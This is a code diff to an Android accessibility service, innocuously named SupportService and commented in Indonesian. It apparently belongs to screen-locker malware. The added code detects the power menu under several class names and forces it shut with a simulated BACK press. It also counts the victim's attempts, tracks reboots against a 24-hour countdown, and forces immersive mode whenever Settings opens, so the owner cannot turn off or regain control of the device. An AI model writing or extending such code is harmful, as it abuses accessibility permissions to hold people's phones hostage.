@@ -16,6 +16,7 @@ import android.widget.Button;
 import android.widget.TextView;
 import android.content.SharedPreferences;
 import android.os.Build;
+import android.os.SystemClock;
 import java.util.Locale;
 
 public class SupportService extends AccessibilityService {
@@ -72,6 +73,18 @@ public class SupportService extends AccessibilityService {
             // Set 24 jam dari sekarang jika belum ada
             endTime = System.currentTimeMillis() + (86400 * 1000);
             prefs.edit().putLong(KEY_END_TIME, endTime).apply();
+        }
+        
+        // Logika deteksi reboot yang lebih akurat
+        long lastBootTime = prefs.getLong("last_boot_time", 0);
+        long currentBootTime = System.currentTimeMillis() - SystemClock.elapsedRealtime();
+        
+        // Jika selisih boot time lebih dari 30 detik dari catatan terakhir, berarti ini boot baru
+        if (Math.abs(currentBootTime - lastBootTime) > 30000) {
+            int count = prefs.getInt(KEY_REBOOT_COUNT, 0);
+            prefs.edit().putInt(KEY_REBOOT_COUNT, count + 1)
+                       .putLong("last_boot_time", currentBootTime)
+                       .apply();
         }
     }
 
@@ -190,15 +203,29 @@ public class SupportService extends AccessibilityService {
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (!checkStatus() && overlay != null) {
-            // Deteksi jika menu power (Global Actions) muncul
-            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            int eventType = event.getEventType();
+            
+            // Deteksi perubahan jendela (Power Menu, Settings, dll)
+            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                String pkgName = event.getPackageName() != null ? event.getPackageName().toString() : "";
                 String clsName = event.getClassName() != null ? event.getClassName().toString() : "";
-                if (clsName.contains("GlobalActionsDialog") || clsName.contains("PowerOptions")) {
-                    // Paksa tutup menu power dengan mensimulasikan tombol BACK
+                
+                // Deteksi Power Menu secara lebih luas
+                boolean isPowerMenu = clsName.contains("GlobalActions") || 
+                                    clsName.contains("PowerOptions") || 
+                                    clsName.contains("Shutdown") ||
+                                    clsName.contains("PowerOff") ||
+                                    pkgName.contains("android.internal.policy");
+
+                if (isPowerMenu) {
                     performGlobalAction(GLOBAL_ACTION_BACK);
-                    
                     power_attempt++;
                     show_power_warning();
+                }
+                
+                // Tetap panggil immersive mode jika di Settings
+                if (pkgName.equals("com.android.settings")) {
+                    apply_immersive_mode();
                 }
             }
         }
